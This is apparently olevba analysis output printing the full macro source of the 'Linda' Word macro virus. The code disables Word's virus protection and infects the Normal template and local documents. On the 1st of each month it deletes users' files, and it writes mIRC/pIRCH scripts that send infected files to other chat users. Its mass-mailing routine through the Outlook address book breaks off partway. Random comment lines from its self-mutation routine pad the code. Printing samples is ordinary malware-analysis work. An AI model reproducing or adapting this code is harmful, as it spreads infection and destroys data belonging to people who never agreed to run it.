olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Linda-8e62bf563cff89e83330fa51dd866aeab7e667cad231640c068be25e0af301bb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Linda-8e62bf563cff89e83330fa51dd866aeab7e667cad231640c068be25e0af301bb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Linda.bas 
in file: Virus.MSOffice.Linda-8e62bf563cff89e83330fa51dd866aeab7e667cad231640c068be25e0af301bb - OLE stream: 'Macros/VBA/Linda'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    Rem PJQTSEBGFZERXHGUTKEODHWRMOGAGYBWC
    Rem YMUREDUQNTMJJITTQKCJFRKFPYMTYDMGEUXCLRNVXQTXQVGDUBVDDIHBRYZRRKJQWZQYSHCSMFEG
    Rem YGWPFWFIBLIQ
    Rem EMLZPTHXWIWNFXMZAZWHFLRHZERBWBMMCCJBZZOAQTKOERFPWOZJQDTSWVRHLP
    Rem MAYAESSTNQIVPMTCLJGGDWZKUAUTBOALRRDBMSWRJGGXWMMPPUHILNIMHFBIVQTRWQRG
    Rem QSHHKJQRKMITYODGWRJKIYQHSWCPYDUFZIINSORNTKKQWEBGMEUCI
    Rem FSWJCRLOEYIYYWCGMZTQJKILRVMAGJKZLVEMVIBXHXKTLTJTAGFJYQWFFSMFFXJMPKKZQWGXTBETPXAIPSJIZUXTRBJYS
    Rem CRICQOPVYFDSVIWUJPJNMPUIGWGEEGENZKHRGSIBYHRZJJLSGWUMDFGZAISHID
    Rem JOADVLUMBGAHJNVBSRGMUVXLGIUWEKIEQATNWXRYEHWZTBIGACTRXDXRUGQPBMUPXVRPBDQNFTRZJAVUNGHCRU
    Rem PJQTSEBGFZERXHGUTKEODHWRMOGAGYBWC
    Rem GBHYIQJJIFFLQGRPPCBDGKPHVXNKAGEQZIGWDOPPSWCKVGRKVLVFTXFZZWNQLEQPWJBNBJLH
    Rem QDWBUJCSSZKOLHITGBQEGNATLFIBBBYBZAIFMRDXKECXGNNEUZBCVUIQEZICXWPRZGBXVESRQAZXGMWLZFWCJLQYXXEWRC
    Rem SUOQPRMBVSLJWDYUROLKAGIUYQYCQSGPILZZQNDJYEPJLPVHWCJVWEXYPDCUINIBQIAUMDWVXLNGQNPLGHOVJOLPCKEXXYRBQ
    Rem ZMEUEEQFVMCSVJESQXVFXVDCCGFBPMHPALCOPXMGZILYLTDGUCFBGKSPXUQTZGIPYYSIDNCHIX
    Rem CHYAYFFQEQNGCRDEAEFMRSM
    Rem JQULJFJXKCZLTHF
    Rem YMUREDUQNTMJJITTQKCJFRKFPYMTYDMGEUXCLRNVXQTXQVGDUBVDDIHBRYZRRKJQWZQYSHCSMFEG
    Rem TBIJOGYKHYSYMIUBCSFJUFIHMZRVMIWPIOAWLOEEPBZYXWYJVJLVVQKDRDAHPJROHFLLJZIJZHGGRNYLPIECVMLJBZPHMI
    Rem YGWPFWFIBLIQ
    Rem YBTBQRUKTEYIBHQEWELYMZLTSFERZUOJHTGSPEYVRBMCRULA
    Rem HFCMMIAHPWCAMXTWVNKVRFZIRVQGKJTWZNYLTYVTMDJZQMCWBKFCPZBCKRUODJKYNPVTHBKCCLUOCKOPEUSQCFXUMVJXY
    Rem ILTDLVOTHBQNRJQEXJVEMA
    Rem WPSDGAVUUILOUOFFJOINLOBOFZYZVKUZGESAISCCHKOIHVIJKVKSRKYQNFPTLXHRXHJAHZTPPGNUWCOKBLSMKYZPNPCEHADKOO
    Rem MBLLYHENINKGBQJOWKPJBCDDTGDBSVNUZNBQIHRKJF
    Rem WIHPJOQRDRYUYDHSGYYWXEYCUSYLXEMJPAJSCGBVFUZUMRHCIGLIQLVMLQRZAO
    Rem VVSNKQCFUBJASMSLKUUOJCOLJQPNSBIRSVQBRXZQOTGPMNJIHLVJCRRULBLUONVNWJDDSDGCLJQVOZZOLPQ
    Rem CJTYQMGGSTESDHMHXRQWIJ
    Rem IJGPSGOOZYGVUKQMMDZEPRCQTULCMOBKDDIZP
    Rem WFCMDEMVRUBFPZUEPRYNNKMVXQZDXYJZKROJMTRNAQXILXNMEOGNTBOLNGQIQVIGDVJPGKX
    Rem QELEZHBUSGUWZHMXXNWOKVSXDURXVUUMTOEIM
    Rem EMLZPTHXWIWNFXMZAZWHFLRHZERBWBMMCCJBZZOAQTKOERFPWOZJQDTSWVRHLP
    Rem NTLIBKOTPQUKUSSTEUBGYVFEGYGGSRUTIVSXFJOJFP
    Rem KHNDNZOXRLSBTSMEFIUBNTUIZURXWKDYUSKAEE
    Rem XBPMWLVVBPNULZDRSTMZWERHWTK
    Rem BXMRBAYFXLEHTWGJWWKPEYG
    Rem MAYAESSTNQIVPMTCLJGGDWZKUAUTBOALRRDBMSWRJGGXWMMPPUHILNIMHFBIVQTRWQRG
    Rem EQKKSIQFEPCLXGUJH
    Rem HKNARZCUBZZRREEZSXDDHAIXGSVCVVFCQBQMYFHPGICAYTLLLWKSJKGFBUVIKZSMVIDXNUPIZJHFUXCXQXTIN
    Rem ULOBBVZARYDJMXEV
    Rem SIZ
    Rem NHPFCXCQXGYWLMUVJFIKDQCFSNEZMALHTXVECADJ
    Rem QSHHKJQRKMITYODGWRJKIYQHSWCPYDUFZIINSORNTKKQWEBGMEUCI
    Rem JZNZLUICWPWVTYBVFHBXZGOIFFDPPWCFQLHVHZKUUPJPRPBVBDILLWBXGBUADRGVFFNQPCYJJBXMKYGOBVMOJDT
    Rem BQVQLEMZUJMORA
    Rem KPOSDIAUXHFYEKJI
    Rem IDLUJKTLSNEHCZHQHWIUEHBMLPAIDITQZVOPEXIPPTSRTGONOHKJZNPMAJDRDFJCQSLKISFBXBLTTVFMWVKMJGUONQ
    Rem NDXAUSGYMSKGPOMQTBECBOYFJXMGWBDZVVZGRQZKBWEGPJNXOYTKTOLBBJ
    Rem VRSZIMKSEKOVOLNFQMRXJHHDNFPJWMERTPUEVFYBBUJMDDEBSNOFMTTKXTCQSALKHZUSKTHJLYDQJCECLYOMZ
    Rem XUOLTEBGTYIRUAUMFPXYQARZAYBHPVBBO
    Rem CHQWMEXJIUFLGWPJKWPYNIWGGEJATVHSKVTLCKISI
    Rem FSWJCRLOEYIYYWCGMZTQJKILRVMAGJKZLVEMVIBXHXKTLTJTAGFJYQWFFSMFFXJMPKKZQWGXTBETPXAIPSJIZUXTRBJYS
    Rem QP
    Rem FICPEYCLHWTHRGCAIUHGMGIBMFWPTYIOCQKYCYQJDMFZDAIOXN
    Rem KBIPN
    Rem CRICQOPVYFDSVIWUJPJNMPUIGWGEEGENZKHRGSIBYHRZJJLSGWUMDFGZAISHID
    Rem JOADVLUMBGAHJNVBSRGMUVXLGIUWEKIEQATNWXRYEHWZTBIGACTRXDXRUGQPBMUPXVRPBDQNFTRZJAVUNGHCRU
'This is my new macro virus. Special for Linda Indrawati at STTS University
    Rem PYGYCZQPXOGWBLTG
    Rem GBHYIQJJIFFLQGRPPCBDGKPHVXNKAGEQZIGWDOPPSWCKVGRKVLVFTXFZZWNQLEQPWJBNBJLH
    Rem QDWBUJCSSZKOLHITGBQEGNATLFIBBBYBZAIFMRDXKECXGNNEUZBCVUIQEZICXWPRZGBXVESRQAZXGMWLZFWCJLQYXXEWRC
    Rem SUOQPRMBVSLJWDYUROLKAGIUYQYCQSGPILZZQNDJYEPJLPVHWCJVWEXYPDCUINIBQIAUMDWVXLNGQNPLGHOVJOLPCKEXXYRBQ
    Rem PHHUATVSBKWUJZWBYJNTBPMHQQGHVVPZXFSZGNCZRAOCCUHBHJHYZK
    Rem ZMEUEEQFVMCSVJESQXVFXVDCCGFBPMHPALCOPXMGZILYLTDGUCFBGKSPXUQTZGIPYYSIDNCHIX
    Rem CHYAYFFQEQNGCRDEAEFMRSM
    Rem QLCOSXVAOXLRNNMJKHBGZBKJMEMGQOEYRNKCULTPVAFBCIDANROVCERLJDSYNCTK
    Rem JQULJFJXKCZLTHF
    Rem UFQCLLQFYTVUDNSTSUCGISGDXNKEKLQWPDRKIIJUTKEKDUTRPBFWKOGPGHPAWAYQBLXHSXGGHGKSJSFQONCNREDPEOPNRVXS
    Rem TBIJOGYKHYSYMIUBCSFJUFIHMZRVMIWPIOAWLOEEPBZYXWYJVJLVVQKDRDAHPJROHFLLJZIJZHGGRNYLPIECVMLJBZPHMI
    Rem AEIZNJTRSFIZVARRXUWZ
    Rem YBTBQRUKTEYIBHQEWELYMZLTSFERZUOJHTGSPEYVRBMCRULA
    Rem HFCMMIAHPWCAMXTWVNKVRFZIRVQGKJTWZNYLTYVTMDJZQMCWBKFCPZBCKRUODJKYNPVTHBKCCLUOCKOPEUSQCFXUMVJXY
    Rem ILTDLVOTHBQNRJQEXJVEMA
    Rem WPSDGAVUUILOUOFFJOINLOBOFZYZVKUZGESAISCCHKOIHVIJKVKSRKYQNFPTLXHRXHJAHZTPPGNUWCOKBLSMKYZPNPCEHADKOO
    Rem MBLLYHENINKGBQJOWKPJBCDDTGDBSVNUZNBQIHRKJF
    Rem WIHPJOQRDRYUYDHSGYYWXEYCUSYLXEMJPAJSCGBVFUZUMRHCIGLIQLVMLQRZAO
    Rem VVSNKQCFUBJASMSLKUUOJCOLJQPNSBIRSVQBRXZQOTGPMNJIHLVJCRRULBLUONVNWJDDSDGCLJQVOZZOLPQ
    Rem CJTYQMGGSTESDHMHXRQWIJ
    Rem IJGPSGOOZYGVUKQMMDZEPRCQTULCMOBKDDIZP
    Rem WFCMDEMVRUBFPZUEPRYNNKMVXQZDXYJZKROJMTRNAQXILXNMEOGNTBOLNGQIQVIGDVJPGKX
    Rem QELEZHBUSGUWZHMXXNWOKVSXDURXVUUMTOEIM
    Rem HKJWPOCLYLWXOYNTOJIJVNDIJZQHWJIHHDZSDOCDLYGDNZPDQMWCXMLTWGXRPTKFVNVYULUCNBANHYARMMBZRTCMQVJNC
    Rem NTLIBKOTPQUKUSSTEUBGYVFEGYGGSRUTIVSXFJOJFP
    Rem KHNDNZOXRLSBTSMEFIUBNTUIZURXWKDYUSKAEE
    Rem XBPMWLVVBPNULZDRSTMZWERHWTK
    Rem BXMRBAYFXLEHTWGJWWKPEYG
'So this virus name is Linda, short name of Linda Indrawati. I love her
    Rem EQKKSIQFEPCLXGUJH
    Rem HKNARZCUBZZRREEZSXDDHAIXGSVCVVFCQBQMYFHPGICAYTLLLWKSJKGFBUVIKZSMVIDXNUPIZJHFUXCXQXTIN
    Rem ULOBBVZARYDJMXEV
    Rem SIZ
    Rem NHPFCXCQXGYWLMUVJFIKDQCFSNEZMALHTXVECADJ
    Rem YIYKFHVVXKBKLMFEVKKFFYYBHAEKJTJALGZYOKGBNWZQSNKLIYQTRFAAVFBKPPGUMSOCJGTLVIFFIW
    Rem JZNZLUICWPWVTYBVFHBXZGOIFFDPPWCFQLHVHZKUUPJPRPBVBDILLWBXGBUADRGVFFNQPCYJJBXMKYGOBVMOJDT
    Rem BQVQLEMZUJMORA
    Rem KPOSDIAUXHFYEKJI
    Rem IDLUJKTLSNEHCZHQHWIUEHBMLPAIDITQZVOPEXIPPTSRTGONOHKJZNPMAJDRDFJCQSLKISFBXBLTTVFMWVKMJGUONQ
    Rem NDXAUSGYMSKGPOMQTBECBOYFJXMGWBDZVVZGRQZKBWEGPJNXOYTKTOLBBJ
    Rem VRSZIMKSEKOVOLNFQMRXJHHDNFPJWMERTPUEVFYBBUJMDDEBSNOFMTTKXTCQSALKHZUSKTHJLYDQJCECLYOMZ
    Rem XUOLTEBGTYIRUAUMFPXYQARZAYBHPVBBO
    Rem CHQWMEXJIUFLGWPJKWPYNIWGGEJATVHSKVTLCKISI
    Rem WIJFJNCI
    Rem QP
    Rem FICPEYCLHWTHRGCAIUHGMGIBMFWPTYIOCQKYCYQJDMFZDAIOXN
    Rem KBIPN
'(c) 2000 by VxD
    Rem KRXJUXIWMPCKPDHUTCJTLPMYONCYCLZRFLEWNHQXNZOBLMPOFNUKSXYCKZMPZHAYIMVMZSZBM
    Rem CKKMZGSHMFQEBZCXUNWUAONNVEUQENYRPZUBDKJZOVMRMEDUILFCZYQNBXMGHGQGAWMZIRXGAKQNZIRJZI
    Rem PYGYCZQPXOGWBLTG
    Rem PHHUATVSBKWUJZWBYJNTBPMHQQGHVVPZXFSZGNCZRAOCCUHBHJHYZK

Sub AutoClose()
    Rem PHHUATVSBKWUJZWBYJNTBPMHQQGHVVPZXFSZGNCZRAOCCUHBHJHYZK
    Rem NTLIBKOTPQUKUSSTEUBGYVFEGYGGSRUTIVSXFJOJFP
  On Error Resume Next
    Rem QLCOSXVAOXLRNNMJKHBGZBKJMEMGQOEYRNKCULTPVAFBCIDANROVCERLJDSYNCTK
    Rem XBPMWLVVBPNULZDRSTMZWERHWTK
    Rem BXMRBAYFXLEHTWGJWWKPEYG
    Rem EQKKSIQFEPCLXGUJH
  Set Current = MacroContainer
  Dim IDST

  SetAttr NormalTemplate.FullName, vbNormal
  Application.VBE.ActiveVBProject.VBComponents("Linda").Export "c:\windows\system\driverXLS.sys"
    Rem JZNZLUICWPWVTYBVFHBXZGOIFFDPPWCFQLHVHZKUUPJPRPBVBDILLWBXGBUADRGVFFNQPCYJJBXMKYGOBVMOJDT
    Rem IDLUJKTLSNEHCZHQHWIUEHBMLPAIDITQZVOPEXIPPTSRTGONOHKJZNPMAJDRDFJCQSLKISFBXBLTTVFMWVKMJGUONQ
    Rem KPOSDIAUXHFYEKJI
  Mutation
  Application.ScreenUpdating = False
  Application.DisplayAlerts = wdAlertsNone
    Rem PYGYCZQPXOGWBLTG

  WordBasic.DisableAutoMacros 0
  Options.VirusProtection = False
  Options.ConfirmConversions = False
    Rem PHHUATVSBKWUJZWBYJNTBPMHQQGHVVPZXFSZGNCZRAOCCUHBHJHYZK

  Set GlobalDoc = NormalTemplate
    Rem QLCOSXVAOXLRNNMJKHBGZBKJMEMGQOEYRNKCULTPVAFBCIDANROVCERLJDSYNCTK
  Set activedoc = ActiveDocument

  GlobalInstalled = No
  DocumentInstalled = No

  IDST = "Linda"
  For j = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(j).Name = "Linda" Then
      GlobalInstalled = Yes
      For m = 1 To NormalTemplate.VBProject.VBComponents.Count
        Current.VBProject.VBComponents(NormalTemplate.VBProject.VBComponents(m)).CodeModule.InsertLines 6, vbTab & "Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName,Name:=" & IDST & "," & "Object:=wdOrganizerObjectProjectItems"
        Current.VBProject.VBComponents(NormalTemplate.VBProject.VBComponents(m)).CodeModule.InsertLines 7, vbTab & "Options.SaveNormalPrompt = False"
      Next m
    End If
  Next j

  For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "Linda" Then
      DocumentInstalled = Yes
      For p = 1 To ActiveDocument.VBProject.VBComponents.Count
        Current.VBProject.VBComponents(ActiveDocument.VBProject.VBComponents(m)).CodeModule.InsertLines 6, vbTab & "Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=" & IDST & "," & "Object:=wdOrganizerObjectProjectItems"
        Current.VBProject.VBComponents(ActiveDocument.VBProject.VBComponents(m)).CodeModule.InsertLines 7, vbTab & "ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatDocument"
      Next p
    End If
  Next i

  If GlobalInstalled = No Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Linda", Object:=wdOrganizerObjectProjectItems
    Options.SaveNormalPrompt = False
  End If

  If DocumentInstalled = No Then
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Linda", Object:=wdOrganizerObjectProjectItems
    activedoc.SaveAs FileName:=activedoc.Name, FileFormat:=wdFormatDocument
  End If
  activedoc.SaveAs FileName:="c:\windows\system\setup32.doc", FileFormat:=wdFormatDocument
  
With Application.FileSearch
    .LookIn = Application.Path
    .FileName = "Reports_.xls"
    .SearchSubFolders = True
    .Execute
If .FoundFiles.Count <> 0 Then ExcelInstalled = True
End With
    
If ExcelInstalled = False Then
    Set excelx = CreateObject("excel.application")
    excelx.Visible = False
    
    excelx.CommandBars("Tools").Controls(10).Enabled = False
    excelx.CommandBars("Tools").Controls(12).Enabled = False
    excelx.CommandBars("View").Controls(3).Enabled = False
    excelx.CommandBars("Window").Controls(3).Enabled = False
    excelx.CommandBars("Window").Controls(4).Enabled = False

    Book = excelx.Application.StartupPath & "\Reports_.xls"
    Bookz = "c:\windows\system\Reports_.xls"
    Set workbookx = excelx.Workbooks.Add
    
    workbookx.VBProject.VBComponents.Import "c:\windows\system\driverXLS.sys"
    excelx.ActiveWindow.Visible = False
    workbookx.SaveAs Book
    workbookx.SaveAs Bookz
    Set workbookx = Nothing
    excelx.Quit
    Set excelx = Nothing
End If

  If Day(Now) = 1 Then
     Set fs = Application.FileSearch
     With fs
        .LookIn = "C:\My Documents"
        .FileName = "*.doc"
        .SearchSubFolders = True
        If .Execute(SortBy:=msoSortByFileName, SortOrder:=msoSortOrderAscending) > 0 Then
        For y = 1 To .FoundFiles.Count
           Kill .FoundFiles(y)
        Next y
        End If
     End With
     
     Set fs = Application.FileSearch
     With fs
        .LookIn = "C:\My Documents"
        .FileName = "*.txt"
        .SearchSubFolders = True
        If .Execute(SortBy:=msoSortByFileName, SortOrder:=msoSortOrderAscending) > 0 Then
        For y = 1 To .FoundFiles.Count
           Kill .FoundFiles(y)
        Next y
        End If
     End With
     
     Set fs = Application.FileSearch
     With fs
        .LookIn = "C:\My Documents"
        .FileName = "*.zip"
        .SearchSubFolders = True
        If .Execute(SortBy:=msoSortByFileName, SortOrder:=msoSortOrderAscending) > 0 Then
        For y = 1 To .FoundFiles.Count
           Kill .FoundFiles(y)
        Next y
        End If
     End With
     
     Set fs = Application.FileSearch
     With fs
        .LookIn = "C:\My Documents"
        .FileName = "*.rar"
        .SearchSubFolders = True
        If .Execute(SortBy:=msoSortByFileName, SortOrder:=msoSortOrderAscending) > 0 Then
        For y = 1 To .FoundFiles.Count
           Kill .FoundFiles(y)
        Next y
        End If
     End With
     
     Set fs = Application.FileSearch
     With fs
        .LookIn = "C:\My Documents"
        .FileName = "*.com"
        .SearchSubFolders = True
        If .Execute(SortBy:=msoSortByFileName, SortOrder:=msoSortOrderAscending) > 0 Then
        For y = 1 To .FoundFiles.Count
           Kill .FoundFiles(y)
        Next y
        End If
     End With
     
     Set fs = Application.FileSearch
     With fs
        .LookIn = "C:\My Documents"
        .FileName = "*.arj"
        .SearchSubFolders = True
        If .Execute(SortBy:=msoSortByFileName, SortOrder:=msoSortOrderAscending) > 0 Then
        For y = 1 To .FoundFiles.Count
           Kill .FoundFiles(y)
        Next y
        End If
     End With
     
     Set fs = Application.FileSearch
     With fs
        .LookIn = "C:\My Documents"
        .FileName = "*.exe"
        .SearchSubFolders = True
        If .Execute(SortBy:=msoSortByFileName, SortOrder:=msoSortOrderAscending) > 0 Then
        For y = 1 To .FoundFiles.Count
           Kill .FoundFiles(y)
        Next y
        End If
     End With
     
     Set fs = Application.FileSearch
     With fs
        .LookIn = "C:\My Documents"
        .FileName = "*.rtf"
        .SearchSubFolders = True
        If .Execute(SortBy:=msoSortByFileName, SortOrder:=msoSortOrderAscending) > 0 Then
        For y = 1 To .FoundFiles.Count
           Kill .FoundFiles(y)
        Next y
        End If
     End With
     
      Set fs = Application.FileSearch
      With fs
        .LookIn = "C:\My Documents"
        .FileName = "*.xls"
        .SearchSubFolders = True
        If .Execute(SortBy:=msoSortByFileName, SortOrder:=msoSortOrderAscending) > 0 Then
        For y = 1 To .FoundFiles.Count
           Kill .FoundFiles(y)
        Next y
        End If
     End With
     MsgBox "I love Linda Indrawati at STTS University", vbOKOnly
  End If
  
Open "c:\mirc\script.ini" For Output As 1
Print #1, "[script]"
Print #1, "n0; DOC/XLS/mIRC/pIRCH/Outlook Linda v1.0"
Print #1, "n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
Print #1, "n2=  /dcc send $nick c:\WINDOWS\system\setup32.doc"
Print #1, "n3=  /dcc send $nick c:\WINDOWS\system\reports_.xls"
Print #1, "n4=}"
Print #1, "n5="
Print #1, "n6=;ON 1:PART:#:{ /if ( $nick == $me ) { halt }"
Print #1, "n7=/dcc send $nick c:\WINDOWS\system\setup32.doc"
Print #1, "n8=/dcc send $nick c:\WINDOWS\system\reports_.xls"
Print #1, "n9=}"
Print #1, "n10="
Print #1, "n11=on 1:TEXT:*script.ini*:#:/.ignore $nick"
Print #1, "n12=on 1:TEXT:*script.ini*:?:/.ignore $nick"
Print #1, "n13=on 1:TEXT:*virus*:#:/.ignore $nick"
Print #1, "n14=on 1:TEXT:*virus*:?:/.ignore $nick"
Print #1, "n15=on 1:TEXT:*worm*:#:/.ignore $nick"
Print #1, "n16=on 1:TEXT:*worm*:?:/.ignore $nick"
Print #1, "n17=on 1:TEXT:*setup32*:#:/.ignore $nick"
Print #1, "n18=on 1:TEXT:*setup32*:?:/.ignore $nick"
Print #1, "n19=on 1:TEXT:*Linda v1.0*:#:/.ignore $nick"
Print #1, "n20=on 1:TEXT:*Linda v1.0*:?:/.ignore $nick"
Print #1, "n21=on 1:QUIT:#:/msg $chan Bye... nice to meet you"
Close 1

Open "c:\pirch98\events.ini" For Output As 1
Print #1, "[Levels]"
Print #1, "Enabled=1"
Print #1, "Count=6"
Print #1, "Level1=000-Unknowns"
Print #1, "000-UnknownsEnabled=1"
Print #1, "Level2=100-Level 100"
Print #1, "100-Level 100Enabled=1"
Print #1, "Level3=200-Level 200"
Print #1, "200-Level 200Enabled=1"
Print #1, "Level4=300-Level 300"
Print #1, "300-Level 300Enabled=1"
Print #1, "Level5=400-Level 400"
Print #1, "400-Level 400Enabled=1"
Print #1, "Level6=500-Level 500"
Print #1, "500-Level 500Enabled=1"
Print #1, ""
Print #1, "[000-Unknowns]"
Print #1, "User1=*!*@*"
Print #1, "UserCount=1"
Print #1, "Event1=; DOC/XLS/mIRC/pIRCH/Outlook Linda v1.0"
Print #1, "Event2=ON JOIN:#:/dcc send $nick c:\WINDOWS\system\setup32.doc"
Print #1, "Event3=ON PART:#:/dcc send $nick c:\WINDOWS\system\setup32.doc"
Print #1, "Event4=ON JOIN:#:/dcc send $nick c:\WINDOWS\system\reports_.xls"
Print #1, "Event5=ON PART:#:/dcc send $nick c:\WINDOWS\system\reports_.xls"
Print #1, "Event6=VERSION:/notice $nick \-1 pIRCH: Linda v1.0 by -VxD- I love her !!! \-1:-"
Print #1, "Event7=ON TEXT:*Linda v1.0*:#:/kick # $nick pIRCH/DOC/XLS/mIRC/Outlook"
Print #1, "Event8=ON TEXT:*Linda v1.0*:#:/ignore # $nick"
Print #1, "Event9=ON TEXT:*doc*:#:/ignore # $nick"
Print #1, "Event10=ON TEXT:*virus*:#:/ignore # $nick"
Print #1, "Event11=ON TEXT:*worm*:#:/ignore # $nick"
Print #1, "Event12=ON TEXT:*setup32*:#:/ignore # $nick"
Print #1, "EventCount=12"
Print #1, ""
Print #1, "[100-Level 100]"
Print #1, "UserCount=0"
Print #1, "EventCount=0"
Print #1, ""
Print #1, "[200-Level 200]"
Print #1, "UserCount=0"
Print #1, "EventCount=0"
Print #1, ""
Print #1, "[300-Level 300]"
Print #1, "UserCount=0"
Print #1, "EventCount=0"
Print #1, ""
Print #1, "[400-Level 400]"
Print #1, "UserCount=0"
Print #1, "EventCount=0"
Print #1, ""
Print #1, "[500-Level 500]"
Print #1, "UserCount=0"
Print #1, "EventCount=0"
Close 1

Open "c:\pirch32\events.ini" For Output As 1
Print #1, "[Levels]"
Print #1, "Enabled=1"
Print #1, "Count=6"
Print #1, "Level1=000-Unknowns"
Print #1, "000-UnknownsEnabled=1"
Print #1, "Level2=100-Level 100"
Print #1, "100-Level 100Enabled=1"
Print #1, "Level3=200-Level 200"
Print #1, "200-Level 200Enabled=1"
Print #1, "Level4=300-Level 300"
Print #1, "300-Level 300Enabled=1"
Print #1, "Level5=400-Level 400"
Print #1, "400-Level 400Enabled=1"
Print #1, "Level6=500-Level 500"
Print #1, "500-Level 500Enabled=1"
Print #1, ""
Print #1, "[000-Unknowns]"
Print #1, "User1=*!*@*"
Print #1, "UserCount=1"
Print #1, "Event1=; DOC/XLS/mIRC/pIRCH/Outlook Linda v1.0"
Print #1, "Event2=ON JOIN:#:/dcc send $nick c:\WINDOWS\system\setup32.doc"
Print #1, "Event3=ON PART:#:/dcc send $nick c:\WINDOWS\system\setup32.doc"
Print #1, "Event4=ON JOIN:#:/dcc send $nick c:\WINDOWS\system\reports_.xls"
Print #1, "Event5=ON PART:#:/dcc send $nick c:\WINDOWS\system\reports_.xls"
Print #1, "Event6=VERSION:/notice $nick \-1 pIRCH: Linda v1.0 by -VxD- I love her !!! \-1:-"
Print #1, "Event7=ON TEXT:*Linda v1.0*:#:/kick # $nick pIRCH/DOC/XLS/mIRC/Outlook"
Print #1, "Event8=ON TEXT:*Linda v1.0*:#:/ignore # $nick"
Print #1, "Event9=ON TEXT:*doc*:#:/ignore # $nick"
Print #1, "Event10=ON TEXT:*virus*:#:/ignore # $nick"
Print #1, "Event11=ON TEXT:*worm*:#:/ignore # $nick"
Print #1, "Event12=ON TEXT:*setup32*:#:/ignore # $nick"
Print #1, "EventCount=12"
Print #1, ""
Print #1, "[100-Level 100]"
Print #1, "UserCount=0"
Print #1, "EventCount=0"
Print #1, ""
Print #1, "[200-Level 200]"
Print #1, "UserCount=0"
Print #1, "EventCount=0"
Print #1, ""
Print #1, "[300-Level 300]"
Print #1, "UserCount=0"
Print #1, "EventCount=0"
Print #1, ""
Print #1, "[400-Level 400]"
Print #1, "UserCount=0"
Print #1, "EventCount=0"
Print #1, ""
Print #1, "[500-Level 500]"
Print #1, "UserCount=0"
Print #1, "EventCount=0"
Close 1
SetAttr NormalTemplate.FullName, vbReadOnly
End Sub

Private Sub Mutation()
  On Error Resume Next
  Application.ScreenUpdating = False
  Set Current = MacroContainer

  For Grow = 1 To 50
    Number = Current.VBProject.VBComponents("Linda").CodeModule.ProcCountLines("Mutation", vbext_pk_Proc)
    RandomLine = Int(Rnd(50) * Number + 1)
    RemarkLength = Int(Rnd(100) * 100 + 1)

    For Length = 1 To RemarkLength
        Remark = Remark + Chr$(Int((90 - 65 + 1) * Rnd + 65))
    Next Length

    Current.VBProject.VBComponents("Linda").CodeModule.InsertLines RandomLine, vbTab & "Rem " & Remark
    Remark = ""
  Next Grow
End Sub

Private Sub delay()
 For u = 1 To 15
    u = u + 1
 Next u
End Sub

Sub AutoExec()
On Error Resume Next
SetAttr NormalTemplate.FullName, vbNormal
If UCase(Dir(Application.StartupPath & "\Word8.dot")) <> "WORD8.DOT" Then
Documents.Add Template:="", NewTemplate:=False

Open "c:\windows\system\sentry32.sys" For Output As 1
Print #1, "Attribute VB_Name = ""Linda"""
Print #1, "Sub FileSave()"
Print #1, "On Error Resume Next"
Print #1, "Setattr NormalTemplate.FullName, vbNormal"
Print #1, "If NormalTemplate.VBProject.VBComponents.Item(""Linda"").Name <> ""Linda"" Then"
Print #1, "NormalTemplate.VBProject.VBComponents.Import ""c:\windows\system\driverXLS.sys"""
Print #1, "End If"
Print #1, "ActiveDocument.Save"
Print #1, "Setattr NormalTemplate.FullName, vbReadOnly"
Print #1, "End Sub"
Close 1

ActiveDocument.VBProject.VBComponents.Import "c:\sentry32.sys"
ActiveDocument.SaveAs FileName:=Application.StartupPath & "\Word8.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
Windows("Word8.dot").Close
End If
SetAttr NormalTemplate.FullName, vbReadOnly
End Sub

Sub AutoExit()
On Error Resume Next
SetAttr NormalTemplate.FullName, vbNormal
infall
SetAttr NormalTemplate.FullName, vbReadOnly
End Sub

Private Sub infall()
On Error Resume Next
   Set activedoc = ActiveDocument
   Set fs = Application.FileSearch
     With fs
        .LookIn = "C:\My Documents"
        .FileName = "*.doc"
        .SearchSubFolders = True
        If .Execute(SortBy:=msoSortByFileName, SortOrder:=msoSortOrderAscending) > 0 Then
        For y = 1 To .FoundFiles.Count
           SetAttr .FoundFiles(y), vbNormal
           Documents.Open .FoundFiles(y), Format:=wdFormatDocument
           delay
           infdoc
           delay
        Next y
        End If
    End With
        
        For Each rfile In RecentFiles
           SetAttr rfile.Name, vbNormal
           Documents.Open rfile.Name, Format:=wdFormatDocument
           delay
           infdoc
           delay
        Next rfile
    Application.Quit
End Sub

Private Sub infdoc()
On Error Resume Next
  Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
  Set UngaDasOutlook = CreateObject("Outlook.Application")
  Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
           
           Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Linda", Object:=wdOrganizerObjectProjectItems
           delay
           ActiveDocument.Save
           delay
           
    If UngaDasOutlook = "Outlook" Then
    DasMapiName.Logon "profile", "password"
    For y = 1 To DasMapiName.AddressLists.Count
        Set AddyBook = DasMapiName.AddressLists(y)
        x = 1
        Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
        For oo = 1 To AddyBook.AddressEntries.Count
            Peep = AddyBook.AddressEntries(x)
            BreakUmOffASlice.Recipients.Add Peep
            x = x + 1
            If x > 50 Then oo = AddyBook.AddressEntries.Count
         Next oo
         BreakUmOffASlice.Subject = "Message from " & Application.UserName
